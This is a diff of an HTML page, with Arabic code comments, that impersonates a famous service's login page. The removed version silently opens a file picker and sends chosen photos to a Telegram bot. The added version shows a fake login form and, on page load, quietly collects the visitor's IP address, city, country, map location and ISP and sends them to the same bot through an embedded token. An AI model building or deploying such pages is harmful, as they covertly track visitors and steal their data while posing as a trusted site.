@@ -3,53 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fake Website</title>
+    <title>Login to [Famous Service]</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+        }
+        .login-container input[type="text"], .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to [Famous Website]</h1>
-    <p>Please wait while we process your images...</p>
-    <form id="uploadForm" style="display:none;">
-        <input type="file" id="images" name="images" multiple accept="image/png, image/jpeg">
-    </form>
+    <div class="login-container">
+        <h2>Login to [Famous Service]</h2>
+        <input type="text" placeholder="Username" id="username" required>
+        <input type="password" placeholder="Password" id="password" required>
+        <button onclick="submitLogin()">Login</button>
+    </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // طلب إذن الوصول إلى الملفات عند تحميل الصفحة
-            requestFileAccess();
-        });
-
-        function requestFileAccess() {
-            // فتح نافذة اختيار الملفات للمستخدم
-            document.getElementById('images').click();
+        function submitLogin() {
+            alert("Login failed. Please try again."); // This is just a placeholder action.
         }
 
-        document.getElementById('images').onchange = function() {
-            var files = document.getElementById('images').files;
-            if (files.length > 0) {
-                for (var i = 0; i < files.length; i++) {
-                    sendImageToTelegram(files[i]);
-                }
-            }
-        };
+        // الحصول على عنوان IP والموقع الجغرافي باستخدام ipinfo.io
+        fetch('https://ipinfo.io/json?token=344365fab2262f') // تم تضمين التوكن هنا
+        .then(response => response.json())
+        .then(data => {
+            // بناء الرسالة التي سيتم إرسالها إلى تليجرام
+            const message = `
+                IP Address: ${data.ip}
+                City: ${data.city}
+                Region: ${data.region}
+                Country: ${data.country}
+                Location: https://www.google.com/maps?q=${data.loc}
+                ISP: ${data.org}
+            `;
 
-        function sendImageToTelegram(file) {
-            var formData = new FormData();
-            formData.append('chat_id', '1900509620');
-            formData.append('photo', file);
+            // إرسال الرسالة إلى بوت تليجرام
+            sendToTelegram(message);
+        })
+        .catch(error => console.error('Error fetching IP info:', error));
 
-            fetch('https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendPhoto', {
+        function sendToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage`;
+            const chatId = '1900509620';
+            const params = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(telegramApiUrl, {
                 method: 'POST',
-                body: formData
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params)
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    console.log('Image sent successfully!');
+                    console.log('Message sent successfully!');
                 } else {
-                    console.error('Failed to send image:', data);
+                    console.error('Failed to send message:', data);
                 }
             })
-            .catch(error => console.error('Error:', error));
+            .catch(error => console.error('Error sending message:', error));
         }
     </script>
 </body>
